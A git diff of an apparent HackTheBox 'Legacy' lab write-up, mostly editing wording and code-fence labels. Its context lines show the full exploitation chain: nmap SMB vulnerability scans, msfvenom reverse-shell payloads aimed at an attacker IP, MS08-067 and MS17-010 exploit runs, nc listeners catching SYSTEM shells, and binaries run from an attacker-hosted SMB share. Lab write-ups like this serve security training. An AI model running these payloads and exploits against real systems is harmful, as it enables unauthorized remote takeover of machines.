@@ -6,15 +6,15 @@ tags: [masscan, legacy, XP, SMB, ms08-67, ms17-010, shellcode, whoami, smbserver
 image: /assets/img/Posts/Legacy.png
 ---
 
-> Legacy from HackTheBox is an retired machine which is vulnerable to infamous MS08-067 & MS17-010 SMB vulnerabilities and can be easily exploited with publicly available scripts and Metasploit.
+> Legacy from HackTheBox is an retired machine which is vulnerable to infamous MS08-067 & MS17-010 SMB vulnerabilities that can be easily exploited with publicly available scripts and Metasploit.
 
->We will use three different methods to pwn the box. Firstly we will use MS08-067 exploit, then MS17-010 exploit and lastly we will use Metasploit for automatic exploitation.
+>We will use three different methods to pwn this box. First, we will use MS08-067 exploit, then MS17-010 exploit and last we will use Metasploit for automatic exploitation.
 
 ## Reconnaissance
 
 Lets start out with `masscan` and `Nmap` to find out open ports and services:
 
-```terminal
+```shell
 cfx:  ~/Documents/htb
 → masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.4
 
@@ -57,13 +57,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 59.95 seconds
 ```
 
-We discovered SMB ports `139 & 445` are open and operating system is Windows XP.
+We discovered SMB ports `139 & 445` are open and operating system running on the host is `Windows XP`.
 
-#### Nmap SMB script
+### Nmap SMB script
 
-Since SMB had its fair share of vulnerabilities, let's run nmap script to check for SMB vulnerabilities.
+Since `SMB` has been exploited widely in the past, let's run `nmap` script to check for SMB vulnerabilities.
 
-```terminal
+```shell
 cfx:  ~/Documents/htb
 → nmap --script smb-vuln* -p 139,445 10.10.10.4
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 16:51 IST
@@ -118,9 +118,9 @@ There are multiple MS08-67 exploits available on the internet but the one which 
 
 To make this python script work we just have to replace the default given shellcode with our own. Shellcode generation command via msfvenom for different payload style is already given in comments by the author inside the script.
 
-#### Generating Shellcode:
+### Generating Shellcode:
 
-```terminal
+```shell
 cfx:  ~/Documents/htb
 → msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows                                
 Found 11 compatible encoders
@@ -176,11 +176,11 @@ Looking at the usage of this exploit on line 228 we can see the exploit requires
 ```
 Based on our Nmap results we know the host is running Windows XP amd taking a wild guess we can go with option 6 fpr `Windows XP SP3 English (NX)`
 
-#### Exploitation
+### Exploitation
 
 Lets start the `nc` listener on port 443 and execute the exploit:
 
-```terminal
+```shell
 cfx:  ~/Documents/htb/legacy
 → /usr/bin/python2 /root/Documents/htb/legacy/ms08-067.py 10.10.10.4 6 445
 #######################################################################
@@ -215,7 +215,7 @@ Exploit finish
 
 As the exploit finishes we get a call back on our listener:
 
-```terminal
+```shell
 cfx:  ~/Documents/htb/legacy
 → nc -lvnp 443
 Ncat: Version 7.80 ( https://nmap.org/ncat )
@@ -246,7 +246,7 @@ We can host `whoami.exe` which is by default available on kali OS inside `/usr/s
 
 Sharing the SMB folder from attacking machine:
 
-```terminal
+```shell
 cfx:  /usr/share/windows-binaries
 → smbserver.py cfx `pwd`
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
@@ -265,7 +265,7 @@ Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
 Running the binary on target machine:
 
-```terminal
+```shell
 C:\WINDOWS\system32>\\10.10.14.14\cfx\whoami.exe
 \\10.10.14.14\cfx\whoami.exe
 NT AUTHORITY\SYSTEM
@@ -280,14 +280,14 @@ For MS17-010 exploit, we will use the [**code**](https://github.com/helviojunior
 
 We can download the exploit using the following command:
 
-```terminal
+```shell
 wget https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py
 ```
 This exploit is pretty straight forward as it just requires and reverse shell executable payload file which it uploads on target machine and executes it.
 
 #### Generating reverse shell payload using MSFvenom
 
-```terminal
+```shell
 cfx:  ~/Documents/htb/legacy/MS17-010
 → msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o cfx.exe
 No encoder specified, outputting raw payload
@@ -296,11 +296,11 @@ Final size of exe file: 73802 bytes
 Saved as: cfx.exe
 ```
 
-#### Exploitation
+### Exploitation
 
 We will start a `nc` listener on port 443 and execute the exploit:
 
-```terminal
+```shell
 cfx:  ~/Documents/htb/legacy/MS17-010
 → /usr/bin/python2 send_and_execute.py 10.10.10.4 cfx.exe
 Trying to connect to 10.10.10.4:445
@@ -337,7 +337,7 @@ Done
 
 And as soon as the exploit completes we get an reverse shell, we can use the same SMB hosted `whomai.exe` binary to comfirm we are running as system:
 
-```terminal
+```shell
 cfx:  ~/Documents/htb/legacy/MS17-010
 → nc -lvnp 443
 Ncat: Version 7.80 ( https://nmap.org/ncat )
@@ -359,7 +359,7 @@ We will execute Metasploit using `msfconsole` and use `exploit/windows/smb/ms08_
 
 Similar to above two methods, we can confirm we got the shell as system with our SMB hosted `whoami.exe` binary.
 
-```terminal
+```shell
 cfx:  ~/Documents/htb/legacy/MS17-010
 → msfconsole
 
